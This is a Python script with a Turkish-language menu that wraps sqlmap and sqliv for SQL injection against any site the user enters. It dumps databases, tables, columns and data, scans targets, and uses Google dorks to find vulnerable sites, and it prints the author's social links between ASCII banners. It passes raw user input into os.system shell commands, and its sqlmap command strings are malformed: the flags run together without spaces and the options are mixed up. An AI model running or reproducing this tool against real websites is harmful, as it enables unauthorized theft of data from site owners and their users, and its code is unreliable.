import os
import sys
import time
from colorama import Fore, Back, Style
os.system("clear")
banner = (Fore.GREEN + """\n
   __                          __                                              __       
  /  |                        /  |                                            /  |      
 _$$ |_    __    __   ______  $$ |   __   ______            _______   ______  $$ |      
/ $$   |  /  |  /  | /      \ $$ |  /  | /      \  ______  /       | /      \ $$ |      
$$$$$$/   $$ |  $$ |/$$$$$$  |$$ |_/$$/ /$$$$$$  |/      |/$$$$$$$/ /$$$$$$  |$$ |      
  $$ | __ $$ |  $$ |$$ |  $$/ $$   $$<  $$ |  $$ |$$$$$$/ $$      \ $$ |  $$ |$$ |      
  $$ |/  |$$ \__$$ |$$ |      $$$$$$  \ $$ \__$$ |         $$$$$$  |$$ \__$$ |$$ |      
  $$  $$/ $$    $$/ $$ |      $$ | $$  |$$    $$/         /     $$/ $$    $$ |$$ |      
   $$$$/   $$$$$$/  $$/       $$/   $$/  $$$$$$/          $$$$$$$/   $$$$$$$ |$$/       
                                                                          $$ |          
                                                                          $$ |          
                                                                          $$/           \n""")
print(banner)
print(Style.RESET_ALL)
print(Fore.RED+"Developer By L'Ombre Noire...")
print("Başlatılıyor Bekleyiniz")
time.sleep(2)
print(Style.RESET_ALL)
istek = input(Fore.YELLOW + """\n   
[1]SqlMap İle Data Çekme
[2]Sqliv İle Site Tarama
[3]SqlMap İle Dork Aratma
[99]Çıkış Yap
____________________
[Seçiminizi Giriniz]
\/\/\/\/\/\/\/\/\/\/
\n""")
print("Seçiminiz:",istek)
print(Style.RESET_ALL)
if istek == '1':
    hedefsite = input(Fore.RED + "Hedef Sitenizi Giriniz: ")
    print(Style.RESET_ALL)
    level = input(Fore.GREEN + "Leveli Giriniz(1-5): ")
    if level > '5':
        print("Hatalı Giriş Yaptınız")
        print("Çıkış Yapılıyor")
        time.sleep(3)
        sys.exit()
    if level < '1':
        print("Hatalı Giriş Yaptınız")
        print("Çıkış Yapılıyor")
        time.sleep(3)
        sys.exit()
    print(Style.RESET_ALL)
    risk = input(Fore.BLUE + "Risk Giriniz(1-3): ")
    if risk > '3':
        print("Hatalı Giriş Yaptınız")
        print("Çıkış Yapılıyor")
        time.sleep(3)
        sys.exit()
    if risk < '1':
        print("Hatalı Giriş Yaptınız")
        print("Çıkış Yapılıyor")
        time.sleep(3)
        sys.exit()
    print(Style.RESET_ALL)
    os.system("clear")
    os.system("sqlmap -u"+"'"+hedefsite+"'"+"--level"+level+"--risk"+risk+"--dbs")
    tablo = input("Hedef Tablolar: ")
    os.system("sqlmap -u"+"'"+hedefsite+"'"+"-D"+tablo+"--tables")
    sutun = input("Hedef Sütün: ")
    os.system("sqlmap -u"+"'"+hedefsite+"'"+"-T"+sutun+"--column")
    data = input("Hedef Data(Aralara Virgül Koyarak Çoklu Yazabilirsiniz): ")
    os.system("sqlmap -u"+"'"+hedefsite+"'"+"-T"+sutun+"-C"+data+"--dump")
    print("Çıkış Yapılıyor Bu Toolu Kullandığınız İçin Teşekkür Ederiz")
    time.sleep(5)
    os.system("clear")
    print(Style.RESET_ALL)
    print(Fore.GREEN+"""\n
                                         .         .                                                                                                                                    
    8 8888         ,o888888o.           ,8.       ,8.          8 888888888o   8 888888888o.   8 8888888888   b.             8     ,o888888o.      8 8888 8 888888888o.   8 8888888888   
    8 8888      . 8888     `88.        ,888.     ,888.         8 8888    `88. 8 8888    `88.  8 8888         888o.          8  . 8888     `88.    8 8888 8 8888    `88.  8 8888         
    8 8888     ,8 8888       `8b      .`8888.   .`8888.        8 8888     `88 8 8888     `88  8 8888         Y88888o.       8 ,8 8888       `8b   8 8888 8 8888     `88  8 8888         
    8 8888     88 8888        `8b    ,8.`8888. ,8.`8888.       8 8888     ,88 8 8888     ,88  8 8888         .`Y888888o.    8 88 8888        `8b  8 8888 8 8888     ,88  8 8888         
    8 8888     88 8888         88   ,8'8.`8888,8^8.`8888.      8 8888.   ,88' 8 8888.   ,88'  8 888888888888 8o. `Y888888o. 8 88 8888         88  8 8888 8 8888.   ,88'  8 888888888888 
    8 8888     88 8888         88  ,8' `8.`8888' `8.`8888.     8 8888888888   8 888888888P'   8 8888         8`Y8o. `Y88888o8 88 8888         88  8 8888 8 888888888P'   8 8888         
    8 8888     88 8888        ,8P ,8'   `8.`88'   `8.`8888.    8 8888    `88. 8 8888`8b       8 8888         8   `Y8o. `Y8888 88 8888        ,8P  8 8888 8 8888`8b       8 8888         
    8 8888     `8 8888       ,8P ,8'     `8.`'     `8.`8888.   8 8888      88 8 8888 `8b.     8 8888         8      `Y8o. `Y8 `8 8888       ,8P   8 8888 8 8888 `8b.     8 8888         
    8 8888      ` 8888     ,88' ,8'       `8        `8.`8888.  8 8888    ,88' 8 8888   `8b.   8 8888         8         `Y8o.`  ` 8888     ,88'    8 8888 8 8888   `8b.   8 8888         
    8 888888888888 `8888888P'  ,8'         `         `8.`8888. 8 888888888P   8 8888     `88. 8 888888888888 8            `Yo     `8888888P'      8 8888 8 8888     `88. 8 888888888888 \n""")
    print(Style.RESET_ALL)
    print(Fore.YELLOW+"İnstagram>>>>>>>>>>>>>>>>>>>>>>>>>>>>>https://www.instagram.com/tarikakcer     ")
    print(Style.RESET_ALL)
    print(Fore.RED+"Github>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>https://github.com/LOmbreNoire           ")
    print(Style.RESET_ALL)
    print(Fore.CYAN+"Discord Kanalım>>>>>>>>>>>>>>>>>>>>>>>>>https://discord.io/bychan                ")
    print(Style.RESET_ALL)
    print(Fore.GREEN+"""\n
     ___ _                  _  _       _  _               
    / __| |_ __ _ _  _ ___ /_\| |_ ___| || |___ _ __  ___ 
    \__ \  _/ _` | || |___/ _ \  _|___| __ / _ \ '  \/ -_)
    |___/\__\__,_|\_, |  /_/ \_\__|   |_||_\___/_|_|_\___|
                   |__/                                    \n""")
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
if istek == '2':
    hedefsite1 = input(Fore.RED + "Hedef Sitenizi Giriniz: ")
    os.system("clear")
    print(banner)
    print(Style.RESET_ALL)
    os.system("sqliv -t "+hedefsite1)
    print("Çıkış Yapılıyor Bu Toolu Kullandığınız İçin Teşekkür Ederiz")
    time.sleep(5)
    print(Fore.YELLOW+"İnstagram>>>>>>>>>>>>>>>>>>>>>>>>>>>>>https://www.instagram.com/tarikakcer     ")
    print(Style.RESET_ALL)
    print(Fore.RED+"Github>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>https://github.com/LOmbreNoire           ")
    print(Style.RESET_ALL)
    print(Fore.CYAN+"Discord Kanalımız>>>>>>>>>>>>>>>>>>>>>>>>>https://discord.io/bychan                ")
    print(Style.RESET_ALL)
    print(Fore.GREEN+"""\n
     ___ _                  _  _       _  _               
    / __| |_ __ _ _  _ ___ /_\| |_ ___| || |___ _ __  ___ 
    \__ \  _/ _` | || |___/ _ \  _|___| __ / _ \ '  \/ -_)
    |___/\__\__,_|\_, |  /_/ \_\__|   |_||_\___/_|_|_\___|
                   |__/                                    \n""")
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
if istek == '3':
    dork = input(Fore.YELLOW + "Aratacağınız Dorku Giriniz: ")
    time.sleep(2)
    os.system("clear")
    os.system("sqlmap"+" -g "+dork)
    print("Çıkış Yapılıyor Bu Toolu Kullandığınız İçin Teşekkür Ederiz")
    time.sleep(5)
    os.system("clear")
    print(Style.RESET_ALL)
    print(Fore.GREEN+"""\n
                                         .         .                                                                                                                                    
    8 8888         ,o888888o.           ,8.       ,8.          8 888888888o   8 888888888o.   8 8888888888   b.             8     ,o888888o.      8 8888 8 888888888o.   8 8888888888   
    8 8888      . 8888     `88.        ,888.     ,888.         8 8888    `88. 8 8888    `88.  8 8888         888o.          8  . 8888     `88.    8 8888 8 8888    `88.  8 8888         
    8 8888     ,8 8888       `8b      .`8888.   .`8888.        8 8888     `88 8 8888     `88  8 8888         Y88888o.       8 ,8 8888       `8b   8 8888 8 8888     `88  8 8888         
    8 8888     88 8888        `8b    ,8.`8888. ,8.`8888.       8 8888     ,88 8 8888     ,88  8 8888         .`Y888888o.    8 88 8888        `8b  8 8888 8 8888     ,88  8 8888         
    8 8888     88 8888         88   ,8'8.`8888,8^8.`8888.      8 8888.   ,88' 8 8888.   ,88'  8 888888888888 8o. `Y888888o. 8 88 8888         88  8 8888 8 8888.   ,88'  8 888888888888 
    8 8888     88 8888         88  ,8' `8.`8888' `8.`8888.     8 8888888888   8 888888888P'   8 8888         8`Y8o. `Y88888o8 88 8888         88  8 8888 8 888888888P'   8 8888         
    8 8888     88 8888        ,8P ,8'   `8.`88'   `8.`8888.    8 8888    `88. 8 8888`8b       8 8888         8   `Y8o. `Y8888 88 8888        ,8P  8 8888 8 8888`8b       8 8888         
    8 8888     `8 8888       ,8P ,8'     `8.`'     `8.`8888.   8 8888      88 8 8888 `8b.     8 8888         8      `Y8o. `Y8 `8 8888       ,8P   8 8888 8 8888 `8b.     8 8888         
    8 8888      ` 8888     ,88' ,8'       `8        `8.`8888.  8 8888    ,88' 8 8888   `8b.   8 8888         8         `Y8o.`  ` 8888     ,88'    8 8888 8 8888   `8b.   8 8888         
    8 888888888888 `8888888P'  ,8'         `         `8.`8888. 8 888888888P   8 8888     `88. 8 888888888888 8            `Yo     `8888888P'      8 8888 8 8888     `88. 8 888888888888 \n""")
    print(Style.RESET_ALL)
    print(Fore.YELLOW+"İnstagram>>>>>>>>>>>>>>>>>>>>>>>>>>>>>https://www.instagram.com/tarikakcer     ")
    print(Style.RESET_ALL)
    print(Fore.RED+"Github>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>https://github.com/LOmbreNoire           ")
    print(Style.RESET_ALL)
    print(Fore.CYAN+"Discord Kanalımız>>>>>>>>>>>>>>>>>>>>>>>>>https://discord.io/bychan                ")
    print(Style.RESET_ALL)
    print(Fore.GREEN+"""\n
     ___ _                  _  _       _  _               
    / __| |_ __ _ _  _ ___ /_\| |_ ___| || |___ _ __  ___ 
    \__ \  _/ _` | || |___/ _ \  _|___| __ / _ \ '  \/ -_)
    |___/\__\__,_|\_, |  /_/ \_\__|   |_||_\___/_|_|_\___|
                   |__/                                    \n""")
                   
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
if istek=='99':
    os.system("clear")
    print("Çıkış Yapılıyor Bu Toolu Kullandığınız İçin Teşekkür Ederiz")
    time.sleep(5)
    os.system("clear")
    print(Style.RESET_ALL)
    print(Fore.GREEN+"""\n
                                         .         .                                                                                                                                    
    8 8888         ,o888888o.           ,8.       ,8.          8 888888888o   8 888888888o.   8 8888888888   b.             8     ,o888888o.      8 8888 8 888888888o.   8 8888888888   
    8 8888      . 8888     `88.        ,888.     ,888.         8 8888    `88. 8 8888    `88.  8 8888         888o.          8  . 8888     `88.    8 8888 8 8888    `88.  8 8888         
    8 8888     ,8 8888       `8b      .`8888.   .`8888.        8 8888     `88 8 8888     `88  8 8888         Y88888o.       8 ,8 8888       `8b   8 8888 8 8888     `88  8 8888         
    8 8888     88 8888        `8b    ,8.`8888. ,8.`8888.       8 8888     ,88 8 8888     ,88  8 8888         .`Y888888o.    8 88 8888        `8b  8 8888 8 8888     ,88  8 8888         
    8 8888     88 8888         88   ,8'8.`8888,8^8.`8888.      8 8888.   ,88' 8 8888.   ,88'  8 888888888888 8o. `Y888888o. 8 88 8888         88  8 8888 8 8888.   ,88'  8 888888888888 
    8 8888     88 8888         88  ,8' `8.`8888' `8.`8888.     8 8888888888   8 888888888P'   8 8888         8`Y8o. `Y88888o8 88 8888         88  8 8888 8 888888888P'   8 8888         
    8 8888     88 8888        ,8P ,8'   `8.`88'   `8.`8888.    8 8888    `88. 8 8888`8b       8 8888         8   `Y8o. `Y8888 88 8888        ,8P  8 8888 8 8888`8b       8 8888         
    8 8888     `8 8888       ,8P ,8'     `8.`'     `8.`8888.   8 8888      88 8 8888 `8b.     8 8888         8      `Y8o. `Y8 `8 8888       ,8P   8 8888 8 8888 `8b.     8 8888         
    8 8888      ` 8888     ,88' ,8'       `8        `8.`8888.  8 8888    ,88' 8 8888   `8b.   8 8888         8         `Y8o.`  ` 8888     ,88'    8 8888 8 8888   `8b.   8 8888         
    8 888888888888 `8888888P'  ,8'         `         `8.`8888. 8 888888888P   8 8888     `88. 8 888888888888 8            `Yo     `8888888P'      8 8888 8 8888     `88. 8 888888888888 \n""")
    print(Style.RESET_ALL)
    print(Fore.YELLOW+"İnstagram>>>>>>>>>>>>>>>>>>>>>>>>>>>>>https://www.instagram.com/tarikakcer     ")
    print(Style.RESET_ALL)
    print(Fore.RED+"Github>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>https://github.com/LOmbreNoire           ")
    print(Style.RESET_ALL)
    print(Fore.CYAN+"Discord Kanalımız>>>>>>>>>>>>>>>>>>>>>>>>>https://discord.io/bychan                ")
    print(Style.RESET_ALL)
    print(Fore.GREEN+"""\n
     ___ _                  _  _       _  _               
    / __| |_ __ _ _  _ ___ /_\| |_ ___| || |___ _ __  ___ 
    \__ \  _/ _` | || |___/ _ \  _|___| __ / _ \ '  \/ -_)
    |___/\__\__,_|\_, |  /_/ \_\__|   |_||_\___/_|_|_\___|
                   |__/                                    \n""")
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------